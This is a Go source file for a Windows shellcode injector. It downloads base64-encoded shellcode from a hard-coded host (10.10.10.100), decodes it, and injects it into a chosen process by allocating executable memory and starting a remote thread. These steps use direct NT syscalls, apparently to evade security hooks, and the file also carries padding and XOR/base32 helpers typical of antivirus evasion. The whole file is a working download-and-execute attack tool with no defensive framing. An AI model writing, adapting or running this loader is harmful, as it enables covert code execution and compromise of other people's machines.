package main

import (
	"encoding/base32"
	"encoding/base64"
	"flag"
	"fmt"
	"github.com/fatih/color"
	bananaWinSycall "github.com/nodauf/bananaWinSyscall/pkg/bananaWinSyscall"
	winsyscall "github.com/nodauf/go-windows"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

func Padding(buff []byte, size int) []byte {
	str1 := "0x48,0x31,0xC0"
	res1 := strings.Repeat(str1, size*1024*1024)
	sum := string(buff) + res1
	mydata := []byte(sum)
	return mydata

}

func init() {

	log.SetFlags(log.Llongfile)
}

func injectShellcode(shellcode []byte, pid uint32) {
	var pHandle windows.Handle

	err := bananaWinSycall.NtOpenProcess(&pHandle, winsyscall.PROCESS_ALL_ACCESS, &windows.OBJECT_ATTRIBUTES{RootDirectory: 0}, &bananaWinSycall.ClientID{UniqueProcess: windows.Handle(pid), UniqueThread: 0})
	//pHandle, err := windows.OpenProcess(winsyscall.PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		log.Fatal("Fail to open process: ", err)
	}

	defer bananaWinSycall.NtClose(&pHandle)

	// Call NtAllocateVirtualMemory (native equivalent of VirtualAllocEx)
	var rPtr uintptr
	regionSize := uintptr(len(shellcode))
	err = bananaWinSycall.NtAllocateVirtualMemory(pHandle, &rPtr, 0, &regionSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)

	if err != nil {
		log.Fatal("Fail allocating executable memory: ", err)
	}

	var bytesWritten uint32
	err = bananaWinSycall.NtWriteVirtualMemory(pHandle, rPtr, &shellcode[0], uintptr(len(shellcode)), &bytesWritten)
	//err = windows.WriteProcessMemory(pHandle, rPtr, &shellcode[0], uintptr(len(shellcode)), &bytesWritten)
	if err != nil {
		log.Fatal("Fail to write to allocated memory: ", err)
	}
	color.Red("Bytes written: ", bytesWritten)
	color.Green("Handle:", pHandle)
	color.Red("len: ", len(shellcode))

	var tHandle windows.Handle
	err = bananaWinSycall.NtCreateThreadEx(&tHandle, windows.STANDARD_RIGHTS_ALL|windows.SPECIFIC_RIGHTS_ALL, nil, pHandle, rPtr, 0, false, 0, 0, 0, 0)

	if err != nil {
		log.Fatal("Fail to write to create thread: ", err)
	}
	defer bananaWinSycall.NtClose(&tHandle)

}

func doReq(url string) (content string) {

	resp, err := http.Get(url)

	if err != nil {

		log.Println(err)
		return
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {

		log.Println(err)
		return
	}

	return string(body)
}

func Xor(buf []byte, xorchar byte) []byte {
	res := make([]byte, len(buf))
	for i := 0; i < len(buf); i++ {
		res[i] = xorchar ^ buf[i]

	}
	return res
}

func Base64Decodebytes(src []byte) ([]byte, error) {
	return base64.StdEncoding.DecodeString(string(src))
}
func Base32custom(code string) string {
	hx, _ := base32.StdEncoding.DecodeString(code)
	//rep := strings.Replace(string(hx), "[/___[*]]", "A", -1)
	return string(hx)
}
func main() {

	var processID int
	flag.IntVar(&processID, "p", 0, "Process ID to inject shellcode into")
	flag.Parse()
	if processID == 0 {
		fmt.Println("Please specify a PID to inject into")
		os.Exit(1)
	}

	code := doReq("http://10.10.10.100/code.txt")

	time.Sleep(time.Second * 10)

	//dc := Base32custom(code)
	ff, _ := Base64Decodebytes([]byte(code))
	//var raw = Xor([]byte(dc), 38)

	injectShellcode(ff, uint32(processID))
}
